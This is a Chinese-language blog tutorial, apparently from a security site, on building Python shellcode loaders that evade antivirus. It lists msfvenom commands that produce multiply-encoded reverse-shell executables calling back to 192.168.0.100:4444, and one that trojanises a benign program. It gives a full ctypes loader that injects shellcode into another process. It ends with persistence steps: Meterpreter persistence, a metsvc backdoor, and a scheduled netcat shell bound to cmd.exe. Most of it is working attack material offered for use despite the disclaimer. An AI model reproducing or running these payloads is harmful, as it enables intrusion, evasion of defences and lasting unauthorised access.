***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

大家好，今天和大家聊聊shellcode。

![](https://image.3001.net/images/20210727/1627376077_60ffc9cd3577b1d311135.png!small)

## 什么是shellcode

我在这里简单讲一下什么是Shellcode。Shellcode实际是一段代码（也可以是填充数据），是用来发送到服务器利用特定漏洞的代码，一般可以获取权限。另外，Shellcode一般是作为数据发送给受攻击服务的。

今天 让我来教大家如何编写py shellcode并且免杀，注入，以及转换成windows可执行文件

## 利用生成cpu可执行的代码

> msfvenom -p windows/x64/exec CMD='calc.exe' -f py
>
> msfvenom -p windows/exec CMD='calc.exe' EXITFUNC=thread -f py

当然，你也可以进行免杀

下面是我以前在freebuf写的文章中的部分内容

> 通常msf裸奔肯定会被某绒查杀，所以使用msf多重编码是个好主意。上代码！
>
> msfvenom -p windows/meterpreter/rever_tcp LHOST=192.168.0.100 LPORT=4444 -e
> x86/shiata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86
> --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86
> --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86
> --platform windows -i 10 -f exe -o a.exe
>
> 10次s编码，5次a编码，10次s编码，最后再来10次c编码。nice！
>
> 随便弄一个叫cc.exe的可执行文件。
>
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -e
> x86/shikata_ga_nai -x cc.exe -i 5 -f exe -o cc2.exe
>
> 用shi对cc进行5次编码，当然你也可以进行多重编码。最后生成注入后的程序cc2。噢噢噢噢，对了你可以增加一个-> k参数，配置攻击载荷在独立的线程内启动，这样不会对cc有所影响。
>
> 最后就是upx加壳
>
> upx -5 cc2.exe -k

![](https://image.3001.net/images/20210727/1627376207_60ffca4fe7e3fff8a676a.png!small)

## shellcode编写

这里我们要调用windows底层api函数，分配内存，给予进程所有权限。。。

这里直接上代码

> from ctypes import *  
> from ctypes.wintypes import *  
> import sys
>
>  
> PAGE_EXECUTE_READWRITE = 0x00000040 # 区域可执行代码，可读可写  
> MEM_COMMIT = 0x3000 # 分配内存  
> PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF ) #给予进程所有权限
>
> # windows api  
> VirtualAlloc = windll.kernel32.VirtualAlloc  
> RtlMoveMemory = windll.kernel32.RtlMoveMemory  
> CreateThread = windll.kernel32.CreateThread  
> WaitForSingleObject = windll.kernel32.WaitForSingleObject  
> OpenProcess = windll.kernel32.OpenProcess  
> VirtualAllocEx = windll.kernel32.VirtualAllocEx  
> WriteProcessMemory = windll.kernel32.WriteProcessMemory  
> CreateRemoteThread = windll.kernel32.CreateRemoteThread
>
> # msfvenom -p windows/x64/exec CMD='calc.exe' -f py  
> shellcode = bytearray(  
> b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"  
> b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"  
> b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"  
> b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"  
> b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"  
> b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"  
> b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"  
> b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"  
> b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"  
> b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"  
> b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"  
> b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"  
> b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"  
> b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"  
> b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"  
> b"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"  
> b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"  
> b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"  
> b"\x63\x2e\x65\x78\x65\x00"  
> )
>
> # msfvenom -p windows/exec CMD='calc.exe' EXITFUNC=thread -f py  
> shellcode1 = b""  
> shellcode1 += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"  
> shellcode1 += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"  
> shellcode1 += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"  
> shellcode1 += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"  
> shellcode1 += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"  
> shellcode1 += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"  
> shellcode1 += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"  
> shellcode1 += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"  
> shellcode1 += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"  
> shellcode1 += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"  
> shellcode1 += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"  
> shellcode1 += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"  
> shellcode1 += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"  
> shellcode1 += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"  
> shellcode1 += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"  
> shellcode1 += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"  
> shellcode1 += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"  
> shellcode1 += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41"  
> shellcode1 += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"  
> shellcode1 += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"  
> shellcode1 += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"  
> shellcode1 += b"\x78\x65\x00"
>
>  
> def run1():  
> VirtualAlloc.restype = ctypes.c_void_p # 重载函数返回类型为void  
> p = VirtualAlloc(c_int(0), c_int(len(shellcode)), MEM_COMMIT,
> PAGE_EXECUTE_READWRITE) # 申请内存  
> buf = (c_char * len(shellcode)).from_buffer(shellcode) # 将shellcode指向指针  
> RtlMoveMemory(c_void_p(p), buf, c_int(len(shellcode))) # 复制shellcode进申请的内存中  
> h = CreateThread(c_int(0), c_int(0), c_void_p(p), c_int(0), c_int(0),
> pointer(c_int(0))) # 执行创建线程  
> WaitForSingleObject(c_int(h), c_int(-1)) # 检测线程创建事件
>
>  
> def run2(pid):  
> h_process = OpenProcess(PROCESS_ALL_ACCESS, False, pid)  
> if h_process:  
> p = VirtualAllocEx(h_process, c_int(0), c_int(len(shellcode1)), MEM_COMMIT,
> PAGE_EXECUTE_READWRITE)  
> WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, c_size_t,
> POINTER(c_size_t)]  
> WriteProcessMemory.restype = BOOL  
> buf = create_string_buffer(shellcode1)  
> WriteProcessMemory(h_process, p, shellcode1, sizeof(buf),
> byref(c_size_t(0)))  
> else:  
> print("无法打开进程pid: %s" % pid)  
> sys.exit()
>
> CreateRemoteThread(h_process, None, c_int(0), p, None, 0, byref(c_ulong(0)))
>
>  
> if __name__ == "__main__":  
> try:  
> if sys.argv[1]:  
> run2(int(sys.argv[1]))  
> else:  
> run1()  
> except IndexError:  
> run1()

这里我建议自定义的shellcode参数最好改掉，不然不怕火绒会检查出敏感词汇。。。

这里我设定的一个检查注入，就是你在执行这个程序的时候需要而外填写，你们可以改掉

剩下我就不多说了，看代码（我懒得打字）

![](https://image.3001.net/images/20210727/1627376148_60ffca1443ab20762bbf1.png!small)

## 转换为windows可执行exe文件

> pyinstaller -f a.py

这里要在windows机器上面执行！pyinstall你们应该都听过。。。

## 拓展

下面是我以前在freebuf写的文章中的部分内容

1.在目标运行M马，取得shell以后。可以先查询进程然后进行注入，这里我们用最简单的方法。直接输入run
post/windows/manage/migrate 模块注入它会自动寻找合适的进程注入，并且自动迁移进程。

2.通过msf自带的persistence模块可以设置启动项来进行维持。下面我来解释一下，拿到shell以后输入run persistence -P
windows/x64/meterper/reverse_tcp -X -i 5 -p 12345 -r 192.168.X.X
配置开机自启动，并且每次尝试连接的时间间隔为5秒。然后我们退出，输入exit，重新配置，开启监听后可以发现不要重新上传shell就可以立即拿到shell

3.通过metsvc模块可以在已经获取shell的设备上面开启一个服务来提供后M功能。自动安装后M run metsvc
-A,他会自动创建一个端口为31337的服务，并且传输3个文件

4.通过scheduleme来创建计划任务，但是要system权限。在我们获取shell后输入getuid获取当前权限，运行getsystem把系统提升为system权限。这里我们又要用到大名鼎鼎的nc了，上传nc并创建计划任务，每分钟执行一次nc
-Ldp 4444 -e cmd.exe，输入run scheduleme -m 1 -e '/nc.exe' -o "-Ldp 4444 -e
cmd.exe"。之后需要连接shell的时候直接输入nc -v 192.168.0.108 4444,用nc进行shell连接

5.通过autorunscript进行迁移进程。设定完lhost，lprot后输入set AutoRunScript
post/windows/manage/migrate 然后run。我这里显示已经自动把进程迁移到了pid为1680的进程

6.通过empire进行维持权限，他是一个基于powershell的渗透测试框架，具体我就不说了。github地址https:github.com/EmpireProject/Empire

请勿用作违法行为，本人对此不负法律责任！

![](https://image.3001.net/images/20210727/1627376176_60ffca3081e43163e4169.jpeg!small)

好的，今天就到这里，希望对你们有帮助，再见~

